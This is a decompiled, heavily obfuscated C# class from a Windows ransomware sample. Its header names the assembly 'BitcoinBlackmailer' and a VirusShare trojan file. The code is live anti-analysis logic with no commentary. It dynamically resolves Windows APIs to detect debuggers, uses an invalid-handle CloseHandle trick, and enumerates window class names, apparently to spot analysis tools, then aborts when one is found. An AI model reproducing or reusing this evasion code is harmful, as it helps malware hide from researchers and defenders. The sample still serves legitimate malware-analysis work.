// Decompiled with JetBrains decompiler
// Type: A.ca10f0b708d6f85b43576905efe355368
// Assembly: BitcoinBlackmailer, Version=2.4.5.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C6D3383-405F-454B-A25B-FBC4B1EC529F
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.Win32.Scar.oenx-0b164fc0270c83f0d5c3ac554421cfbccd0404ae7c79f700aa485fdf86912ef4.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace A
{
  internal class ca10f0b708d6f85b43576905efe355368
  {
    internal const uint c232b037d063b548302f5eede640a4311 = 1024;
    internal const uint c42f94456e45707851662cd22475fcb75 = 64;
    internal const int c2400e54e3a7f06eeeec3ec226c294cf5 = 0;
    private static bool c68ba1860db0b995c60fb58f975a0df44;

    [DllImport("kernel32.dll", EntryPoint = "SetLastError")]
    internal static extern void c31171104344079923e742bf10b1f3d5a(
      uint c69c4856cca5032d10bdd624d8cbeea1d);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
    internal static extern int ca197a9a61a0ffec93419422e4ff8afa5(
      IntPtr c497c687c38fe45991acf2490458e8831);

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    internal static extern IntPtr c1d4e4b0d9a21e1ad77a82121383169a6(
      uint c8a516748cd2be3069e2b2b6294300a9a,
      int c2f9c4033cb44b7687acc276982da8a69,
      uint cec6be859d72fbe6d037d1fe3775836e9);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcessId")]
    internal static extern uint c2093c99a197b9c60cb48fd30c9e35455();

    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary", CharSet = CharSet.Auto, SetLastError = true)]
    internal static extern IntPtr c99ec513b2813d25519babf6eed94db6d(
      string c01d229c604193c73471c1f2085841fcd);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern ca10f0b708d6f85b43576905efe355368.cabbda898a870b08fb2b4c33444a4971d c90f6bdaec1785a347641936ba34ca73d(
      IntPtr cd8d2f3dcc142456747282804d375604d,
      string cdc5260500b9e460c9ab8e141c79cdbdf);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern ca10f0b708d6f85b43576905efe355368.cbd34d4b14f2e91124b8cf3b6ba1c87e9 c6bf29b8942a67d373f7425b887506f7a(
      IntPtr cd8d2f3dcc142456747282804d375604d,
      string cdc5260500b9e460c9ab8e141c79cdbdf);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern ca10f0b708d6f85b43576905efe355368.cac2e309e0dde734287f5f95c17f30d09 c5bb95a5ec02e996487174dfae617f350(
      IntPtr cd8d2f3dcc142456747282804d375604d,
      string cdc5260500b9e460c9ab8e141c79cdbdf);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern ca10f0b708d6f85b43576905efe355368.c6bf774f6ecbfd593dd2d5284a0b2bdc9 c4cb548eb3b27bcfd5320484999cf2167(
      IntPtr cd8d2f3dcc142456747282804d375604d,
      string cdc5260500b9e460c9ab8e141c79cdbdf);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern ca10f0b708d6f85b43576905efe355368.c2e691f2ceee508ad3afe6939e9b3c3e7 c368757b1212f40b5d1db2013d72fea9e(
      IntPtr cd8d2f3dcc142456747282804d375604d,
      string cdc5260500b9e460c9ab8e141c79cdbdf);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern ca10f0b708d6f85b43576905efe355368.c792e6eaf0e69651813408b35781738d6 c535677f66b32ef747c313922190ee4fd(
      IntPtr cd8d2f3dcc142456747282804d375604d,
      string cdc5260500b9e460c9ab8e141c79cdbdf);

    private static int c4d3e1ae4e5640b4d9f9423e4753b012e(
      IntPtr c5febc39858f41368611e9deebda73f28,
      IntPtr c86803851fac5b9d0f870330cea05bafa)
    {
      string[] strArray1 = new string[c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1224)];
      strArray1[c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1228)] = c4a59d2fa0ebc25e984c54562e0d99937.c665b0cad13ff30f54bc12d341300f2e2(6048);
      string[] strArray2 = strArray1;
      string cfb65a9e65370c31164ac1a12baae8fad1 = ca10f0b708d6f85b43576905efe355368.c6a0f359628cb31f63378f19bbaac9626(c5febc39858f41368611e9deebda73f28);
      string[] strArray3 = strArray2;
      for (int index = c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1232); index < strArray3.Length; index += c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1248))
      {
        string cfb65a9e65370c31164ac1a12baae8fad2 = strArray3[index];
        if (c9470ce92886e7b9b0dc5ca77349ca373.c35c1bacace48a06917bcd6ffc78fd0a9(cfb65a9e65370c31164ac1a12baae8fad1, cfb65a9e65370c31164ac1a12baae8fad2, c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1236) != 0) == 0)
        {
label_2:
          switch (5)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (ca10f0b708d6f85b43576905efe355368.c4d3e1ae4e5640b4d9f9423e4753b012e);
              }
              ca10f0b708d6f85b43576905efe355368.c68ba1860db0b995c60fb58f975a0df44 = c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1240) != 0;
              return c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1244);
          }
        }
      }
label_8:
      switch (7)
      {
        case 0:
          goto label_8;
        default:
          return c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1252);
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetClassName", CharSet = CharSet.Auto)]
    internal static extern int c8bf25cc93fed7175b88b3f50061f8c53(
      IntPtr c665ba7307fd78e9fa4fca97d6a532257,
      StringBuilder ca76ae6f03434ec233da710bede332ed4,
      int c15f777b055e18ae3f84a89202205a051);

    internal static string c6a0f359628cb31f63378f19bbaac9626(
      IntPtr c382265a79fe9c3943d13b84f721e575c)
    {
      StringBuilder stringBuilder = c53742274e6559cda082214213d68dd62.c35c1bacace48a06917bcd6ffc78fd0a9(c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1256));
      ca10f0b708d6f85b43576905efe355368.c8bf25cc93fed7175b88b3f50061f8c53(c382265a79fe9c3943d13b84f721e575c, stringBuilder, c4cd706801f0995cf2a24f3cbe3405597.c513e70930454458ec4d4bc388d1df56f((object) stringBuilder));
      return c890014a83ace5ad6086cf083926fb6bd.c513e70930454458ec4d4bc388d1df56f((object) stringBuilder);
    }

    internal static void c2975045993c9be7face87782080de9ff()
    {
      if (!ca10f0b708d6f85b43576905efe355368.ce2facec737b4300731ebccd502151bae())
        return;
label_1:
      switch (3)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ca10f0b708d6f85b43576905efe355368.c2975045993c9be7face87782080de9ff);
          }
          string cfb65a9e65370c31164ac1a12baae8fad = c4a59d2fa0ebc25e984c54562e0d99937.c665b0cad13ff30f54bc12d341300f2e2(6063);
          throw c5afc8aeb502ad7173afdb71748ad94cf.c35c1bacace48a06917bcd6ffc78fd0a9(c3fe2263568a25e8d3393f7675d8a8867.c35c1bacace48a06917bcd6ffc78fd0a9(c4a59d2fa0ebc25e984c54562e0d99937.c665b0cad13ff30f54bc12d341300f2e2(6080), (object) cfb65a9e65370c31164ac1a12baae8fad));
      }
    }

    internal static bool ce2facec737b4300731ebccd502151bae()
    {
      try
      {
        if (c07ba93790d4c8274c81af8eaf1566f17.c35c1bacace48a06917bcd6ffc78fd0a9())
        {
label_1:
          switch (5)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (ca10f0b708d6f85b43576905efe355368.ce2facec737b4300731ebccd502151bae);
              }
              return c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1260) != 0;
          }
        }
        else
        {
          IntPtr cd8d2f3dcc142456747282804d375604d = ca10f0b708d6f85b43576905efe355368.c99ec513b2813d25519babf6eed94db6d(c4a59d2fa0ebc25e984c54562e0d99937.c665b0cad13ff30f54bc12d341300f2e2(6207));
          ca10f0b708d6f85b43576905efe355368.c6bf774f6ecbfd593dd2d5284a0b2bdc9 c6bf774f6ecbfd593dd2d5284a0b2bdc9 = ca10f0b708d6f85b43576905efe355368.c4cb548eb3b27bcfd5320484999cf2167(cd8d2f3dcc142456747282804d375604d, c4a59d2fa0ebc25e984c54562e0d99937.c665b0cad13ff30f54bc12d341300f2e2(6232));
          if (c6bf774f6ecbfd593dd2d5284a0b2bdc9 != null && c6bf774f6ecbfd593dd2d5284a0b2bdc9() != 0)
            return c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1264) != 0;
          uint cec6be859d72fbe6d037d1fe3775836e9 = ca10f0b708d6f85b43576905efe355368.c2093c99a197b9c60cb48fd30c9e35455();
          IntPtr num1 = ca10f0b708d6f85b43576905efe355368.c1d4e4b0d9a21e1ad77a82121383169a6((uint) c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1268), c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1272), cec6be859d72fbe6d037d1fe3775836e9);
          if (c2b25c5c01fdc527c0fdcaf113311847a.c35c1bacace48a06917bcd6ffc78fd0a9(num1, IntPtr.Zero))
          {
label_8:
            switch (7)
            {
              case 0:
                goto label_8;
              default:
                try
                {
                  ca10f0b708d6f85b43576905efe355368.cac2e309e0dde734287f5f95c17f30d09 cac2e309e0dde734287f5f95c17f30d09 = ca10f0b708d6f85b43576905efe355368.c5bb95a5ec02e996487174dfae617f350(cd8d2f3dcc142456747282804d375604d, c4a59d2fa0ebc25e984c54562e0d99937.c665b0cad13ff30f54bc12d341300f2e2(6267));
                  if (cac2e309e0dde734287f5f95c17f30d09 != null)
                  {
                    int pbDebuggerPresent = c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1276);
                    if (cac2e309e0dde734287f5f95c17f30d09(num1, ref pbDebuggerPresent) != 0)
                    {
label_11:
                      switch (2)
                      {
                        case 0:
                          goto label_11;
                        default:
                          if (pbDebuggerPresent != 0)
                          {
label_13:
                            switch (7)
                            {
                              case 0:
                                goto label_13;
                              default:
                                return c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1280) != 0;
                            }
                          }
                          else
                            break;
                      }
                    }
                    else
                      break;
                  }
                  else
                    break;
                }
                finally
                {
                  ca10f0b708d6f85b43576905efe355368.ca197a9a61a0ffec93419422e4ff8afa5(num1);
                }
                break;
            }
          }
          bool flag = c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1284) != 0;
          try
          {
            ca10f0b708d6f85b43576905efe355368.ca197a9a61a0ffec93419422e4ff8afa5(new IntPtr(c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1288)));
          }
          catch
          {
            flag = c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1292) != 0;
          }
          if (flag)
          {
label_20:
            switch (5)
            {
              case 0:
                goto label_20;
              default:
                return c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1296) != 0;
            }
          }
          else
          {
            try
            {
              ca10f0b708d6f85b43576905efe355368.c792e6eaf0e69651813408b35781738d6 c792e6eaf0e69651813408b35781738d6 = ca10f0b708d6f85b43576905efe355368.c535677f66b32ef747c313922190ee4fd(ca10f0b708d6f85b43576905efe355368.c99ec513b2813d25519babf6eed94db6d(c4a59d2fa0ebc25e984c54562e0d99937.c665b0cad13ff30f54bc12d341300f2e2(6320)), c4a59d2fa0ebc25e984c54562e0d99937.c665b0cad13ff30f54bc12d341300f2e2(6341));
              if (c792e6eaf0e69651813408b35781738d6 != null)
              {
label_23:
                switch (2)
                {
                  case 0:
                    goto label_23;
                  default:
                    ca10f0b708d6f85b43576905efe355368.c68ba1860db0b995c60fb58f975a0df44 = c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1300) != 0;
                    int num2 = c792e6eaf0e69651813408b35781738d6(new ca10f0b708d6f85b43576905efe355368.ccb01f1473e2a4f161fc20addf8b4175c(ca10f0b708d6f85b43576905efe355368.c4d3e1ae4e5640b4d9f9423e4753b012e), IntPtr.Zero);
                    if (ca10f0b708d6f85b43576905efe355368.c68ba1860db0b995c60fb58f975a0df44)
                    {
label_25:
                      switch (1)
                      {
                        case 0:
                          goto label_25;
                        default:
                          return c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1304) != 0;
                      }
                    }
                    else
                      break;
                }
              }
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
      return c001bc1b0517549452b8f4e72309b6c25.cd3f060e98751c590ecec99965b0fe2c5(1308) != 0;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal class c0aa93a662994ca7ad8a6d95cdae88475
    {
      internal IntPtr ccf3277550f3933cb86173eba997f3a1d;
      internal IntPtr c392055809e7509ad17c4e6ee4bf94842;
      internal IntPtr c148c6682583fa81e1e0432d63f662a64;
      internal IntPtr c812200ebc07c9292ce2b1cbe69cb6643;
      internal IntPtr cbbf4e8fb32ebeaf2c8f362e17089695e;
      internal IntPtr ccafa0251f8f6d2bde39eff077374ce18;
    }

    internal delegate int cabbda898a870b08fb2b4c33444a4971d(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      ca10f0b708d6f85b43576905efe355368.c0aa93a662994ca7ad8a6d95cdae88475 ProcessInformation,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int cbd34d4b14f2e91124b8cf3b6ba1c87e9(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      out uint debugPort,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int c6bf774f6ecbfd593dd2d5284a0b2bdc9();

    internal delegate void c2e691f2ceee508ad3afe6939e9b3c3e7([MarshalAs(UnmanagedType.LPStr)] string lpOutputString);

    internal delegate int cac2e309e0dde734287f5f95c17f30d09(
      IntPtr hProcess,
      ref int pbDebuggerPresent);

    internal delegate int ccb01f1473e2a4f161fc20addf8b4175c(IntPtr wnd, IntPtr lParam);

    internal delegate int c792e6eaf0e69651813408b35781738d6(
      ca10f0b708d6f85b43576905efe355368.ccb01f1473e2a4f161fc20addf8b4175c lpEnumFunc,
      IntPtr lParam);
  }
}
